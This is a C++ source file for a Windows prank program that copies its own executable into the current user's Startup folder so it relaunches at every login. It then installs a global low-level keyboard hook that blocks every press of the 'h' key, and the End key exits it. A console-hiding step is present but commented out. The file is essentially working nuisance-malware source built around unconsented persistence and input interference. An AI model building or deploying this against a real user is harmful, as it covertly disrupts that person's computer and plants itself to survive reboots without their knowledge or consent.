#include <stdio.h>
#include "define.h"
#include "keyhook.cpp"

void sendWarningMessage() {
	int msgboxID = MessageBox(
		NULL,
		(LPCTSTR)"The 'h' key has been disabled on this computer.",
		(LPCTSTR)"Warning",
		MB_ICONWARNING | MB_OK
	);
}

void autoStart() {
	// C:\Users\speep\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
	std::string trPathString;
	char szPath[MAX_PATH];
	PSTR lpFilename;
	// retrieve path for current module (szPath)
	GetModuleFileName(NULL, szPath, sizeof szPath);

	// pointer to filename part of the string containing the full path
	lpFilename = (strrchr(szPath, '\\') + 1);
	
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::string s(username);

	trPathString = "C:\\Users\\" + s + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\h.exe";
	char* trPath = const_cast<char*>(trPathString.c_str());

	std::ifstream src(szPath, std::ios::binary);
	std::ofstream dest(trPath, std::ios::binary);
	dest << src.rdbuf();

	//printf(trPath);
	//printf(szPath);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	BOOL fEatKeystroke = false;

	if (nCode == HC_ACTION) {
		switch (wParam) {
		case WM_KEYDOWN:
		case WM_KEYUP:
			PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
			if (fEatKeystroke = (p->vkCode == KEY_H)) {
				printf("h blocked");
				//sendWarningMessage();
				return 1;
			}
			if (fEatKeystroke = (p->vkCode == KEY_END)) {
				exit(0);
			}
			break;
		}
	}
	// if true-> 1
	// if false-> again bitch
	return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}

int main(int argc, const char* argv[])
{
	//begin routine

	/*
	if (IsWindowVisible(::GetConsoleWindow()) != FALSE) {
		ShowWindow(::GetConsoleWindow(), SW_HIDE);
	}
	*/

	autoStart();

	HHOOK lowlevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
	MSG msg;

	while (!GetMessage(&msg, NULL, NULL, NULL)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(lowlevelKybd);

	return 0;
}